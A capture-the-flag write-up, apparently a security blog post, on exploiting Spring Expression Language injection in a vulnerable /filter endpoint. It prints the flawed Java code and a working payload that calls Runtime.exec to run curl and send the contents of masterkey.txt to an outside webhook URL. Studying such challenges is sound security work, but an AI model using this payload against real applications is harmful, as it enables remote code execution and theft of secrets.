---
layout: post
title: "SpEL Injection Exploit ‚Äì AppSec Master Challenge Writeup"
categories: code-review
tags: [spel, java, rce, injection, challenge]
image: https://www.appsecmaster.net/assets/appLogo.svg
pin: false
comments: true
toc: true
---

In this challenge from [AppSec Master](https://www.appsecmaster.net/en/challenge/bf1cf76c-22fd-4e48-bd69-d3bdf4861547), the goal was to exploit a **Spring Expression Language (SpEL) injection** to execute a command on the server and exfiltrate the content of the `masterkey.txt` file.

## Objective

Leverage a vulnerable `/filter` endpoint to execute arbitrary Java code via SpEL injection and read the contents of `masterkey.txt`.

---

## Source Code Analysis

Here‚Äôs the relevant part of the server-side code:

```java
@PostMapping("/filter")
public Object filter(@RequestBody Map<String, String> payload) {
    String filter = payload.get("filter");

    if (!filter.startsWith("username") && !filter.startsWith("ipaddr") && !filter.startsWith("role")) {
        return Map.of("error", "Only filtering on 'username', 'ipaddr' and 'role' is allowed");
    }

    ExpressionParser parser = new SpelExpressionParser();
    List<String> result = new ArrayList<>();

    for (User user : users) {
        StandardEvaluationContext context = new StandardEvaluationContext(user);
        try {
            Boolean matches = parser.parseExpression(filter).getValue(context, Boolean.class);
            if (Boolean.TRUE.equals(matches)) {
                result.add(user.getUsername());
            }
        } catch (Exception e) {
            return Map.of("error", "Evaluation failed");
        }
    }

    return Map.of("result", result);
}
````

---

## Key Observations

- The backend accepts a JSON payload with a `filter` key.
    
- It performs a _weak check_ to ensure the filter string starts with `username`, `ipaddr`, or `role`.
    
- The filter is then evaluated using **SpEL**, which can interpret and execute Java-like expressions.
    

This opens up a door to **Expression Injection**, especially since `parser.parseExpression()` is used directly on user input.

---

## Exploiting SpEL Injection

Since only the **start** of the filter string is validated, we can inject arbitrary expressions using `or`.

### Payload:

```json
{
  "filter": "username == 'omar' or T(java.lang.Runtime).getRuntime().exec(new String[]{\"curl\", \"--data-urlencode\", \"leak@masterkey.txt\", \"https://webhook.site/518649e2-bcb2-453f-aee1-caa48a6ab505\"})"
}
```

This payload does the following:

- `username == 'omar'` passes the startsWith check.
    
- `or` allows us to short-circuit and execute our SpEL expression.
    
- `T(java.lang.Runtime).getRuntime().exec(...)` executes the Java `Runtime.exec()` method.
    
- We use the array syntax `new String[]{...}` to avoid shell interpretation issues in Java.
    
- `--data-urlencode` causes `curl` to read the content of `masterkey.txt` and send it as POST data to [webhook.site](https://webhook.site/).
    

---

## Result

The request was sent, and I successfully received the contents of the file on the webhook

---

## üîê Key Takeaways

- SpEL Injection is extremely dangerous when user-controlled input is evaluated without sanitization.
    
- `T(...)` gives access to arbitrary Java classes.
    
- Runtime execution should never be exposed via dynamic expression evaluation.
    

---

## üìö References

- [Spring Expression Language (SpEL) Docs](https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions)
    
- [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)
    
- [Spring4Shell ‚Äì CVE-2022-22965](https://nvd.nist.gov/vuln/detail/CVE-2022-22965)
    

---

If you enjoyed this write-up, feel free to follow me on [Twitter](https://twitter.com/00xmora)